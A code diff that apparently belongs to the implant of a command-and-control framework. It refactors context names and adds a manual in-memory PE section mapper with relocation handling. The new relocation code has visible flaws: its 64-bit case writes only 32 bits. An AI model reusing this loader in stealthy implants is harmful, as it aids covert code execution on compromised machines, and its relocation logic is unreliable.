@@ -114,7 +114,7 @@ namespace Objects {
         const auto file_head = exe->nt_head->FileHeader;
 
         // NOTE: register veh as execution safety net
-        if (!(veh_handle = Ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
+        if (!(veh_handle = ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
             success = false;
             goto defer;
         }
@@ -144,7 +144,7 @@ namespace Objects {
                     protect |= PAGE_NOCACHE;
                 }
 
-                if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->sec_map[sec_index].address, &exe->sec_map[sec_index].size, protect, nullptr))) {
+                if (!NT_SUCCESS(ntstatus = ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->sec_map[sec_index].address, &exe->sec_map[sec_index].size, protect, nullptr))) {
                     success = false;
                     goto defer;
                 }
@@ -152,7 +152,7 @@ namespace Objects {
         }
 
         if (exe->fn_map->size) {
-            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->fn_map->address, &exe->fn_map->size, PAGE_READONLY, nullptr))) {
+            if (!NT_SUCCESS(ntstatus = ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->fn_map->address, &exe->fn_map->size, PAGE_READONLY, nullptr))) {
                 success = false;
                 goto defer;
             }
@@ -193,7 +193,7 @@ namespace Objects {
 
     defer:
         if (veh_handle) {
-            Ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handle);
+            ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handle);
         }
 
         return success;
@@ -290,6 +290,64 @@ namespace Objects {
         return success;
     }
 
+    BOOL MapSections(PLOADMODULE module) {
+        HEXANE;
+
+        auto image      = CreateImageData(module->buffer);
+        auto region_size = (size_t) image->nt_head->OptionalHeader.SizeOfImage;
+
+        module->base = image->nt_head->OptionalHeader.ImageBase;
+
+        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+            module->base != image->nt_head->OptionalHeader.ImageBase) {
+
+            module->base = 0;
+            region_size = image->nt_head->OptionalHeader.SizeOfImage;
+
+            if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
+                return false;
+            }
+        }
+
+        for (DWORD i = 0; i < image->nt_head->OptionalHeader.SizeOfHeaders; i++) {
+            B_PTR(module->base)[i] = module->buffer[i];
+        }
+
+        for (DWORD i = 0; i < image->nt_head->FileHeader.NumberOfSections; i++, image->section++) {
+            for (DWORD j = 0; j < image->section->SizeOfRawData; j++) {
+
+                (B_PTR(module->base + image->section->VirtualAddress))[j] = (module->buffer + image->section->PointerToRawData)[j];
+            }
+        }
+
+        ULONG_PTR base_offset           = module->base - image->nt_head->OptionalHeader.ImageBase;
+        PIMAGE_DATA_DIRECTORY relocdir  = &image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+        if ((module->base - image->nt_head->OptionalHeader.ImageBase) && relocdir) {
+            PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, module->base, relocdir->VirtualAddress);
+
+            do {
+                PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY) reloc + 1;
+
+                do {
+                    switch (head->Type) {
+                        case IMAGE_REL_BASED_DIR64:     *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
+                        case IMAGE_REL_BASED_HIGHLOW:   *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32_t) base_offset; break;
+                        case IMAGE_REL_BASED_HIGH:      *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
+                        case IMAGE_REL_BASED_LOW:       *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
+                    }
+                    head++;
+
+                } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);
+
+                reloc = (PIMAGE_BASE_RELOCATION) head;
+            } while (reloc->VirtualAddress);
+        }
+
+        image->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
+        return true;
+    }
+
     SIZE_T GetFunctionMapSize(_executable *exe) {
 
         char sym_name[9]    = { };
@@ -326,16 +384,16 @@ namespace Objects {
     VOID AddCoff(_coff_params *coff) {
         HEXANE;
 
-        _coff_params *head = Ctx->coffs;
+        _coff_params *head = ctx->bof_cache;
 
         if (ENCRYPTED) {
-            XteaCrypt((uint8_t*) coff->data, coff->data_size, Ctx->config.session_key, true);
-            XteaCrypt((uint8_t*) coff->args, coff->args_size, Ctx->config.session_key, true);
-            XteaCrypt((uint8_t*) coff->entrypoint, coff->entrypoint_length, Ctx->config.session_key, true);
+            XteaCrypt((uint8_t*) coff->data, coff->data_size, ctx->config.session_key, true);
+            XteaCrypt((uint8_t*) coff->args, coff->args_size, ctx->config.session_key, true);
+            XteaCrypt((uint8_t*) coff->entrypoint, coff->entrypoint_length, ctx->config.session_key, true);
         }
 
-        if (!Ctx->coffs) {
-            Ctx->coffs = coff;
+        if (!ctx->bof_cache) {
+            ctx->bof_cache = coff;
         }
         else {
             do {
@@ -351,19 +409,19 @@ namespace Objects {
         }
     }
 
-    COFF_PARAMS* GetCoff(const uint32_t coff_id) {
+    COFF_PARAMS* GetCoff(const uint32_t bof_id) {
         HEXANE;
 
-        auto head = Ctx->coffs;
+        auto head = ctx->bof_cache;
         // NOTE: coff_id will be a known name hash
 
         do {
             if (head) {
-                if (head->coff_id == coff_id) {
+                if (head->bof_id == bof_id) {
                     if (ENCRYPTED) {
-                        XteaCrypt((uint8_t*)head->data, head->data_size, Ctx->config.session_key, false);
-                        XteaCrypt((uint8_t*)head->args, head->args_size, Ctx->config.session_key, false);
-                        XteaCrypt((uint8_t*)head->entrypoint, head->entrypoint_length, Ctx->config.session_key, false);
+                        XteaCrypt((uint8_t*)head->data, head->data_size, ctx->config.session_key, false);
+                        XteaCrypt((uint8_t*)head->args, head->args_size, ctx->config.session_key, false);
+                        XteaCrypt((uint8_t*)head->entrypoint, head->entrypoint_length, ctx->config.session_key, false);
                     }
 
                     return head;
@@ -378,23 +436,23 @@ namespace Objects {
         while (true);
     }
 
-    VOID RemoveCoff(uint32_t coff_id) {
+    VOID RemoveCoff(uint32_t bof_id) {
         HEXANE;
 
         _coff_params *prev = { };
 
-        if (!coff_id) {
+        if (!bof_id) {
             return;
         }
 
-        for (auto head = Ctx->coffs; head; head = head->next) {
-            if (head->coff_id == coff_id) {
+        for (auto head = ctx->bof_cache; head; head = head->next) {
+            if (head->bof_id == bof_id) {
 
                 if (prev) {
                     prev->next = head->next;
                 }
                 else {
-                    Ctx->coffs = head->next;
+                    ctx->bof_cache = head->next;
                 }
 
                 MemSet(head->data, 0, head->data_size);
@@ -419,7 +477,7 @@ namespace Objects {
         if (!exe || !exe->base) {
             return;
         }
-        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &exe->base, &exe->size, PAGE_READWRITE, nullptr))) {
+        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &exe->base, &exe->size, PAGE_READWRITE, nullptr))) {
             // LOG ERROR
             return;
         }
@@ -429,7 +487,7 @@ namespace Objects {
         void *pointer   = exe->base;
         size_t size     = exe->size;
 
-        if (!NT_SUCCESS(ntstatus = Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
+        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
             // LOG ERROR
             return;
         }
@@ -467,7 +525,7 @@ namespace Objects {
 
         exe->size += exe->fn_map->size;
 
-        x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &exe->base, exe->size, &exe->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+        x_ntassertb(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &exe->base, exe->size, &exe->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
         for (uint16_t sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
             const auto section = SECTION_HEADER(exe->buffer, sec_index);
